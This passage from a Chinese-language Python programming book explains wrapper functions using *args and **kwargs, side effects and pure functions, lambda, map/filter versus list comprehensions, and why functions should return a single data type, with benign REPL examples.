<code>**</code>语法也可用于创建可变参数函数。<code>def</code>语句中的<code>*</code>语法表示不定数量的位置参数，而<code>**</code>语法表示不定数量的可选关键字参数。如果不使用<code>**</code>语法定义接受多个关键字参数（其中有多个参数是可选的）的函数，就很难编写<code>def</code>语句。假设有一个<code>formMolecule()</code>函数，它接受已经发现的118种化学元素作为参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">formMolecule</span>(<span class="hljs-params">hydrogen, helium, lithium, beryllium, boron, --snip--</span><br></code></pre></td></tr></table></figure><p>　　如果指定<code>hydrogen</code>的参数为2，<code>oxygen</code>的参数为1以返回<code>water</code>，按照这种写法会比较麻烦，可读性差，因为其他的无关元素必须被设置为0：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>formMolecule(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span> --snip--<br><span class="hljs-string">&#x27;water&#x27;</span><br></code></pre></td></tr></table></figure><p>　　使用命名的关键字参数可以更容易管理函数，每个参数都可以设置默认值，而不必在函数调用中传递参数。</p><blockquote><p><strong>注意</strong>　尽管术语“实参”和“形参”的定义很清楚，但程序员更倾向于将“关键字形参”和“关键字实参”统称为“关键字参数”。</p></blockquote><h3 id="10-3-5-使用-和-创建包装函数"><a href="#10-3-5-使用-和-创建包装函数" class="headerlink" title="10.3.5　使用*和**创建包装函数"></a>10.3.5　使用<code>*</code>和<code>**</code>创建包装函数</h3><p>　　在<code>def</code>语句中，<code>*</code>和<code>**</code>语法的一个常见用途是创建包装函数。包装函数用来将接受的参数传递给另一个函数并返回该函数的结果。使用<code>*</code>和<code>**</code>语法可以向被包装的函数转发任何参数。比如，创建一个<code>printLowercase()</code>函数来包装内置的<code>print()</code>函数。<code>printLowercase()</code>函数依靠<code>print()</code>完成实际工作，但会先将字符串参数转换为小写形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">printLower</span>(<span class="hljs-params">*args, **kwargs</span>): ❶<br><span class="hljs-meta">... </span>    args = <span class="hljs-built_in">list</span>(args) ❷<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">for</span> i, value <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(args):<br><span class="hljs-meta">... </span>        args[i] = <span class="hljs-built_in">str</span>(value).lower()<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(*args, **kwargs) ❸<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>name = <span class="hljs-string">&#x27;Albert&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>printLower(<span class="hljs-string">&#x27;Hello,&#x27;</span>, name)<br>hello, albert<br><span class="hljs-meta">&gt;&gt;&gt; </span>printLower(<span class="hljs-string">&#x27;DOG&#x27;</span>, <span class="hljs-string">&#x27;CAT&#x27;</span>, <span class="hljs-string">&#x27;MOOSE&#x27;</span>, sep=<span class="hljs-string">&#x27;, &#x27;</span>)<br>dog, cat, moose<br></code></pre></td></tr></table></figure><p>　　<code>printLower()</code>函数通过<code>*</code>语法接受<code>args</code>参数对应的元组❶，其中包含了不定数量的位置参数。<code>**</code>语法则将所有关键字参数整理成一个字典分配给<code>kwargs</code>参数。如果一个函数同时使用<code>*args</code>和<code>**kwargs</code>，那么<code>*args</code>参数必须位于<code>**kwargs</code>参数之前。我们创建的函数需要首先修改一些参数，再将参数传递给被包装的<code>print()</code>函数，所以<code>args</code>元组可以转换为列表形式❷。</p><p>　　在将<code>args</code>中的字符串改为小写后，使用<code>*</code>和<code>**</code>语法将<code>args</code>中的项和<code>kwargs</code>中的键−值对作为不同参数逐个传递给<code>print()</code>❸。<code>printLower()</code>会将<code>print()</code>的返回值作为自己的返回值。这些步骤有效地包装了<code>print()</code>函数。</p><h2 id="10-4-函数式编程"><a href="#10-4-函数式编程" class="headerlink" title="10.4　函数式编程"></a>10.4　函数式编程</h2><p>　　<strong>函数式编程</strong>是一种编程范式，它强调在不修改全局变量和任何外界状态（如硬盘上的文件、互联网连接或数据库）的情况下编写函数进行计算。Erlang、Lisp、Haskell等编程语言在很大程度上是围绕着函数式编程的概念设计的。尽管Python并不完全遵循函数式编程范式，但也有一些函数式编程的特性。Python程序能使用的主要特性有：无副作用的函数、高阶函数和lambda函数。</p><h3 id="10-4-1-副作用"><a href="#10-4-1-副作用" class="headerlink" title="10.4.1　副作用"></a>10.4.1　副作用</h3><p>　　副作用是指函数对自身代码和局部变量之外的其他部分所做的任何改变。为了说明白这一点，我们创建一个<code>subtract()</code>函数，实现Python减法运算符的功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">subtract</span>(<span class="hljs-params">number1, number2</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> number1 - number2<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>subtract(<span class="hljs-number">123</span>, <span class="hljs-number">987</span>)<br>-<span class="hljs-number">864</span><br></code></pre></td></tr></table></figure><p>这个<code>subtract()</code>函数没有副作用。换言之，它不会影响程序中任何该函数代码之外的部分。从程序或者计算机的状态中没办法推测出<code>subtract()</code>是被调用了1次、2次还是100万次。无副作用的函数是可以修改其内部的局部变量的，因为这些变化与程序中的其他部分是隔离的。</p><p>　　假设有一个<code>addToTotal()</code>函数，它的功能是将数字参数添加到名为<code>TOTAL</code>的全局变量中：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">TOTAL = <span class="hljs-number">0</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">addToTotal</span>(<span class="hljs-params">amount</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">global</span> TOTAL</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    TOTAL += amount</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">return</span> TOTAL</span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">addToTotal(<span class="hljs-number">10</span>)</span><br>10<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">addToTotal(<span class="hljs-number">10</span>)</span><br>20<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">addToTotal(<span class="hljs-number">9999</span>)</span><br>10019<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">TOTAL</span><br>10019<br></code></pre></td></tr></table></figure><p><code>addToTotal()</code>函数有一个副作用，它修改了存在于函数之外的元素，即<code>TOTAL</code>这个全局变量。副作用不仅仅指对全局变量的修改，还包括更新或删除文件、在屏幕上显示文本、打开数据库连接、服务器鉴权或者对函数本身以外做的任何修改。函数调用在返回后留下的任何痕迹都是副作用。</p><p>　　副作用也可以包括对函数外使用的可变对象进行的原地改变。比如，下面的<code>removeLastCatFromList()</code>函数原地修改了列表参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">removeLastCatFromList</span>(<span class="hljs-params">petSpecies</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(petSpecies) &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> petSpecies[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;cat&#x27;</span>:<br><span class="hljs-meta">... </span>        petSpecies.pop()<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>myPets = [<span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;bird&#x27;</span>, <span class="hljs-string">&#x27;cat&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>removeLastCatFromList(myPets)<br><span class="hljs-meta">&gt;&gt;&gt; </span>myPets<br>[<span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;bird&#x27;</span>]<br></code></pre></td></tr></table></figure><p>在这个例子中，<code>myPets</code>变量和<code>petSpecies</code>参数持有对同一个列表的引用。在函数中对列表对象所做的任何原地修改也会存在于函数外，所以这种修改会产生副作用。</p><p>　　一个相关概念是<strong>确定性函数</strong>，指在给定相同参数的情况下总是返回相同值的函数。比如<code>subtract(123, 987)</code>函数调用总是返回<code>-864</code>，Python内置的<code>round()</code>函数在传递<code>3.14</code>作为参数时总是返回<code>3</code>。</p><p>　　<strong>非确定性函数</strong>则在传递相同参数时不会总是返回相同的值。例如，调用<code>random.randint(1, 10)</code>会返回一个1和10之间的随机整数。<code>time.time()</code>函数虽然没有参数，但它的返回值取决于调用函数时所在计算机的时钟设置。时钟是一种外部资源，跟参数一样都属于函数的输入。依赖于函数外部资源（包括全局变量、硬盘上的文件、数据库和互联网连接）的函数，都被认为是非确定性函数。</p><p>　　确定性函数的一个好处是它们的值可以被缓存。如果<code>subtract()</code>能够记住第一次调用时的返回值，那就没必要重复计算123和987的差值。因此，确定性函数允许我们牺牲空间换取时间，即通过使用内存空间缓存之前的结果来缩短函数运行时间。</p><p>　　无副作用的确定性函数被称为<strong>纯函数</strong>。函数式程序员尽量在程序中只编写纯函数。除了上文提到的，纯函数还有以下好处：</p><ul><li>适合单元测试，因为不需要设置任何外部资源；</li><li>通过相同参数调用纯函数，很容易复现纯函数中的错误；</li><li>纯函数内调用其他纯函数，仍然保持为纯函数；</li><li>在多线程程序中，纯函数式线程是安全的，可以安全地同时运行（多线程不在本书讨论范畴内）；</li><li>对纯函数的多次调用可以同时在并行的CPU核或者在多线程程序上运行，因为它们不依赖于对其运行顺序有要求的外部资源。</li></ul><p>　　你可以在Python中编写纯函数，而且应该尽量这样做。在Python中编写纯函数仅是一个习惯做法，没有任何设置让Python解释器强制要求程序员编写纯函数。编写纯函数的最常见的方法是避免在函数内部使用全局变量，并确保不与文件、互联网、系统时钟、随机数或其他外部资源交互。</p><h3 id="10-4-2-高阶函数"><a href="#10-4-2-高阶函数" class="headerlink" title="10.4.2　高阶函数"></a>10.4.2　高阶函数</h3><p>　　高阶函数可以接受函数作为参数或者使用参数作为返回值。例如，定义一个名为<code>callItTwice()</code>的函数，它将两次调用给定的函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">callItTwice</span>(<span class="hljs-params">func, *args, **kwargs</span>):<br><span class="hljs-meta">... </span>    func(*args, **kwargs)<br><span class="hljs-meta">... </span>    func(*args, **kwargs)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>callItTwice(<span class="hljs-built_in">print</span>, <span class="hljs-string">&#x27;Hello, world!&#x27;</span>)<br>Hello, world!<br>Hello, world!<br></code></pre></td></tr></table></figure><p><code>callItTwice()</code>可以接受任何传递进来的函数。在Python中，函数是头等对象，这意味着它具备其他任何对象都有的功能：可以把函数存储在变量中，作为参数传递，或者把它作为返回值使用。</p><h3 id="10-4-3-lambda函数"><a href="#10-4-3-lambda函数" class="headerlink" title="10.4.3　lambda函数"></a>10.4.3　lambda函数</h3><p>　　<strong>lambda函数</strong>也被称为<strong>匿名函数</strong>或者<strong>无名函数</strong>，是没有名字的简化版函数，其代码仅包含一条返回语句。在将函数作为参数传递给其他函数时，我们经常会用到lambda函数。</p><p>　　比如，我们可以创建一个常规函数，它接受由矩形的宽高组成的列表，具体来说，矩形规格为4乘10：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">rectanglePerimeter</span>(<span class="hljs-params">rect</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> (rect[<span class="hljs-number">0</span>] * <span class="hljs-number">2</span>) + (rect[<span class="hljs-number">1</span>] * <span class="hljs-number">2</span>)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>myRectangle = [<span class="hljs-number">4</span>, <span class="hljs-number">10</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>rectanglePerimeter(myRectangle)<br><span class="hljs-number">28</span><br></code></pre></td></tr></table></figure><p>等效的lambda函数是这样的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">lambda</span> rect: (rect[<span class="hljs-number">0</span>] * <span class="hljs-number">2</span>) + (rect[<span class="hljs-number">1</span>] * <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>　　在Python中定义lambda函数，需要以<code>lambda</code>关键字开头，后面是一个以逗号分隔的参数列表（如果有参数的话），紧接着是一个冒号，最后是一个作为返回值的表达式。由于函数是头等对象，因此你可以把lambda函数赋值给一个变量，相当于<code>def</code>语句的快捷副本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>rectanglePerimeter = <span class="hljs-keyword">lambda</span> rect: (rect[<span class="hljs-number">0</span>] * <span class="hljs-number">2</span>) + (rect[<span class="hljs-number">1</span>] * <span class="hljs-number">2</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>rectanglePerimeter([<span class="hljs-number">4</span>, <span class="hljs-number">10</span>])<br><span class="hljs-number">28</span><br></code></pre></td></tr></table></figure><p>这个lambda函数被赋值给了名为<code>rectanglePerimeter</code>的变量，本质上是提供了一个<code>rectanglePerimeter()</code>函数。如你所见，由<code>lambda</code>创建的函数和由<code>def</code>语句创建的函数是一样的。</p><blockquote><p><strong>注意</strong>　在实际的代码中，应该使用<code>def</code>语句，而非将lambda函数赋值给常量。lambda函数的正确用法仅是用来创建匿名函数。</p></blockquote><p>　　lambda函数的语法便于将小函数指定为其他函数调用的参数。比如，<code>sorted()</code>函数有一个名为<code>key</code>的关键字参数，需要指定一个函数作为实参。当传入<code>key</code>时，<code>sorted()</code>函数将会根据函数的返回值而非项本身的值对列表中的项进行排序。在下面这个示例中，我们传递给<code>sorted()</code>函数一个lambda函数，函数的功能是返回给定矩形的周长。这样<code>sorted()</code>函数将基于每个列表项<code>[width, height]</code>所计算得到的周长进行排序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>rects = [[<span class="hljs-number">10</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">9</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">9</span>]]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">sorted</span>(rects, key=<span class="hljs-keyword">lambda</span> rect: (rect[<span class="hljs-number">0</span>] * <span class="hljs-number">2</span>) + (rect[<span class="hljs-number">1</span>] * <span class="hljs-number">2</span>))<br>[[<span class="hljs-number">2</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">9</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">9</span>]]<br></code></pre></td></tr></table></figure><p>在这个示例中，该函数不是对数值<code>[10, 2]</code>和<code>[3, 6]</code>进行排序，而是根据返回的周长整数值24和18进行排序。lambda表达式是一种便捷的语法缩写形式：你可以指定一个小的lambda函数（只有一行长），而非使用<code>def</code>语句定义一个命名函数。</p><h3 id="10-4-4-在列表推导式中进行映射和过滤"><a href="#10-4-4-在列表推导式中进行映射和过滤" class="headerlink" title="10.4.4　在列表推导式中进行映射和过滤"></a>10.4.4　在列表推导式中进行映射和过滤</h3><p>　　<code>map()</code>函数和<code>filter()</code>函数是Python早期版本中常见的高阶函数，二者可以转换和过滤列表，通常会结合lambda函数使用。映射（map）可以根据原列表的值创建新列表，过滤（filter）则可以创建一个只包含原列表中符合某种标准的值的新列表。</p><p>　　如果你想将整数列表<code>[8, 16，18，19，12，1，6，7]</code>转换为字符串类型的新列表，那么可以把这个列表和<code>lambda n: str(n)</code>传递给<code>map()</code>函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>mapObj = <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> n: <span class="hljs-built_in">str</span>(n), [<span class="hljs-number">8</span>, <span class="hljs-number">16</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>])<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">list</span>(mapObj)<br>[<span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;16&#x27;</span>, <span class="hljs-string">&#x27;18&#x27;</span>, <span class="hljs-string">&#x27;19&#x27;</span>, <span class="hljs-string">&#x27;12&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>]<br></code></pre></td></tr></table></figure><p><code>map()</code>函数返回一个<code>map</code>对象，将其传递给<code>list()</code>函数即可得到列表。映射后的列表包含与原列表中整数值相对应的字符串值。<code>filter()</code>函数与之类似，但其中作为参数的lambda函数的作用是决定列表中的哪些项会被保留（当lambda函数返回<code>True</code>时），哪些会被过滤（当lambda函数返回<code>False</code>时）。例如，我们可以通过<code>lambda n: n % 2 == 0</code>过滤掉数组中的奇数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>filterObj = <span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> n: n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>, [<span class="hljs-number">8</span>, <span class="hljs-number">16</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>])<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">list</span>(filterObj)<br>[<span class="hljs-number">8</span>, <span class="hljs-number">16</span>, <span class="hljs-number">18</span>, <span class="hljs-number">12</span>, <span class="hljs-number">6</span>]<br></code></pre></td></tr></table></figure><p><code>filter()</code>函数返回一个过滤器对象，将其传递给<code>list()</code>函数，即可得到仅包含偶数的列表。</p><p>　　但使用<code>map()</code>函数和<code>filter()</code>函数来创建映射列表和过滤列表已经是Python的过时做法了。更好的方法是使用列表推导式创建。列表推导式不仅不必编写lambda函数，还比<code>map()</code>和<code>filter()</code>更快。这里给出一个等效于<code>map()</code>函数的列表推导式示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>[<span class="hljs-built_in">str</span>(n) <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> [<span class="hljs-number">8</span>, <span class="hljs-number">16</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]]<br>[<span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;16&#x27;</span>, <span class="hljs-string">&#x27;18&#x27;</span>, <span class="hljs-string">&#x27;19&#x27;</span>, <span class="hljs-string">&#x27;12&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>]<br></code></pre></td></tr></table></figure><p>注意，列表推导式的<code>str(n)</code>部分与<code>lambda n: str(n)</code>相似。</p><p>　　在此，我们给出一个等效于<code>filter()</code>函数的列表推导式示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>[n <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> [<span class="hljs-number">8</span>, <span class="hljs-number">16</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]  <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>]<br>[<span class="hljs-number">8</span>, <span class="hljs-number">16</span>, <span class="hljs-number">18</span>, <span class="hljs-number">12</span>, <span class="hljs-number">6</span>]<br></code></pre></td></tr></table></figure><p>注意，列表推导式的<code>if n % 2 == 0</code>部分与<code>lambda n: n % 2 == 0</code>相似。</p><p>　　许多语言有“函数是头等对象”的概念，也有诸如映射函数和过滤函数的高阶函数。</p><h2 id="10-5-返回值的数据类型应该不变"><a href="#10-5-返回值的数据类型应该不变" class="headerlink" title="10.5　返回值的数据类型应该不变"></a>10.5　返回值的数据类型应该不变</h2><p>　　Python是动态数据类型语言，这意味着Python中的函数和方法可以自由地返回任何数据类型的值。但为了让函数具备更好的可预测性，应该尽量仅返回单一数据类型的值。</p><p>　　比如这里有一个函数，它随机地返回整数值或者字符串值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> random<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">returnsTwoTypes</span>():<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">if</span> random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) == <span class="hljs-number">1</span>:<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">return</span> <span class="hljs-number">42</span><br><span class="hljs-meta">... </span>    <span class="hljs-keyword">else</span>:<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;forty two&#x27;</span><br></code></pre></td></tr></table></figure><p>　　在编写该函数的调用代码时，很可能忘记需要处理多种可能的数据类型。在下面这个例子中，假设我们调用<code>returnsTwoTypes()</code>并希望把它返回的数字转换为十六进制数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>hexNum = <span class="hljs-built_in">hex</span>(returnsTwoTypes())<br><span class="hljs-meta">&gt;&gt;&gt; </span>hexNum<br><span class="hljs-string">&#x27;0x2a&#x27;</span><br></code></pre></td></tr></table></figure><p>Python的内置函数<code>hex()</code>接受一个整数，返回的是该整数对应的十六进制数的字符串。当<code>returnsTwoTypes()</code>返回整数时，这段代码能够正常执行，没什么问题。但当<code>returnsTwoTypes()</code>返回字符串时，就会抛出异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>hexNum = <span class="hljs-built_in">hex</span>(returnsTwoTypes())<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-string">&#x27;str&#x27;</span> <span class="hljs-built_in">object</span> cannot be interpreted <span class="hljs-keyword">as</span> an integer<br></code></pre></td></tr></table></figure><p>　　当然，我们应该始终记得处理任何一种数据类型的返回值，但在现实中经常会忘记。为了避免此类错误，应该尽量使函数的返回值只有一种数据类型。这不是一个死规定，在不得已的情况下，函数可以返回不同数据类型的值。但返回的数据类型越少，函数就越简单，也越不易出错。</p><p>　　有一种情况要特别注意——除非函数的返回值总是<code>None</code>，否则不要在某些情况下返回<code>None</code>。<code>None</code>值是<code>NoneType</code>数据类型的唯一值。人们很容易通过返回<code>None</code>来说明函数发生了错误（10.6节将讨论返回错误码），但正确的做法是尽量只在函数无法返回有意义的值时才返回<code>None</code>。</p><p>　　通过返回<code>None</code>表示错误通常是造成不易捕获的<code>&#39;NoneType&#39; object has no attribute</code>这一异常的根源：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> random<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">sometimesReturnsNone</span>():<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">if</span> random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) == <span class="hljs-number">1</span>:<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello!&#x27;</span><br><span class="hljs-meta">... </span>    <span class="hljs-keyword">else</span>:<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>returnVal = sometimesReturnsNone()<br><span class="hljs-meta">&gt;&gt;&gt; </span>returnVal.upper()<br><span class="hljs-string">&#x27;HELLO!&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>returnVal = sometimesReturnsNone()<br><span class="hljs-meta">&gt;&gt;&gt; </span>returnVal.upper()<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>AttributeError: <span class="hljs-string">&#x27;NoneType&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;upper&#x27;</span><br></code></pre></td></tr></table></figure><p>这段错误信息非常模糊，需要花些精力才能定位到通常会返回预期结果的函数上，而问题出在这个函数在发生错误时返回了<code>None</code>。问题发生的原因是<code>sometimesReturnsNone()</code>返回<code>None</code>，然后我们将其赋值给了<code>returnVal</code>变量。但是，错误信息会让你误以为问题发生在对<code>upper()</code>方法的调用中。</p><p>　　在2009年的一次会议上，计算机科学家Tony 